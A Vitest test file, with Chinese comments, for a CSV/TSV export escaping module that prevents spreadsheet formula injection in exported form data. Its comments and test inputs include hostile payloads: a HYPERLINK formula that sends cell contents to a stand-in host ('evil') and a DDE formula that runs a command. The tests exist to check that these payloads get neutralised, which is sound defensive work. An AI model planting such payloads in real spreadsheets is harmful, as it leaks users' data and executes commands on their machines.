// 表格文本导出的统一转义（2026-11-01 #282）
//
// ## 为什么有这一层
//
// 同一件事本来有三种写法，分布在三个文件里：
//   - data/composables/useTableExtras.ts        自带 csvFormulaSafe
//   - data/composables/useTableScreenshot.ts    的 buildTsv 内联一份前缀判定
//   - form-builder/designer/FormDataSummary.vue 一份都没有（只做引号转义）
// 前两条防住了，第三条漏了 —— 而第三条导出的正是**表单收集来的用户数据**（最不可信）。
//
// ## 公式注入是什么
//
// Excel / WPS / LibreOffice 把以 `=` `+` `-` `@` 开头的单元格当**公式**解析。
// 经典载荷不是 `=1+1`，而是 `=HYPERLINK("http://evil/"&A1,"点我")` 或
// `=cmd|'/c calc'!A0`（DDE）：用户看不出异常，数据却在泄露/执行。
import { describe, it, expect } from 'vitest'
import {
  csvFormulaSafe,
  stripTabularControls,
  csvCell,
  tsvCell,
} from '@/components/_internal/tabular-export'

describe('csvFormulaSafe', () => {
  it.each(['=1+1', '+SUM(A1)', '-2+3', '@cmd', "=HYPERLINK(\"http://evil/\")", "=cmd|'/c calc'!A0"])(
    '%j 加单引号前缀',
    (v) => {
      expect(csvFormulaSafe(v)).toBe(`'${v}`)
    },
  )

  it.each(['普通值', 'a=b', '金额-100', 'x@y', '', '中文内容', '1+1'])('%j 不加前缀（不在开头）', (v) => {
    expect(csvFormulaSafe(v)).toBe(v)
  })

  it('制表符/回车打头也视为危险（未清洗前的原始判定）', () => {
    expect(csvFormulaSafe('\tx')).toBe("'\tx")
    expect(csvFormulaSafe('\rx')).toBe("'\rx")
  })
})

describe('stripTabularControls', () => {
  it('值内 \\t \\r \\n 全部变空格（否则粘贴进 Excel 行列错位）', () => {
    expect(stripTabularControls('a\tb')).toBe('a b')
    expect(stripTabularControls('任务1\n任务2')).toBe('任务1 任务2')
    expect(stripTabularControls('a\r\nb')).toBe('a b')
    expect(stripTabularControls('\t\n')).toBe(' ')
  })
})

describe('csvCell', () => {
  it('**一律带引号**（本仓既有 CSV 契约：宿主解析按全字段带引号写过）', () => {
    expect(csvCell('普通值')).toBe('"普通值"')
    expect(csvCell('')).toBe('""')
  })

  it('内嵌引号双写', () => {
    expect(csvCell('说"你好"')).toBe('"说""你好"""')
  })

  it('**公式值的前缀在引号内**（放在引号外会被 Excel 当公式）', () => {
    expect(csvCell('=1+1')).toBe('"\'=1+1"')
    expect(csvCell("=cmd|'/c calc'!A0")).toBe('"\'=cmd|\'/c calc\'!A0"')
  })

  it('含逗号/换行的值不破坏列结构', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('a\nb')).toBe('"a\nb"')
  })
})

describe('tsvCell', () => {
  it('先清洗控制字符，再判公式前缀', () => {
    expect(tsvCell('正常')).toBe('正常')
    expect(tsvCell('a\tb')).toBe('a b')
    expect(tsvCell('=1+1')).toBe("'=1+1")
  })

  it('控制字符打头：清洗成空格即安全，不加前缀（Excel 遇前导空格按文本处理）', () => {
    expect(tsvCell('\tx')).toBe(' x')
    expect(tsvCell('\r\n=x')).toBe(' =x')
    expect(tsvCell('\n=x')).toBe(' =x')
  })
})
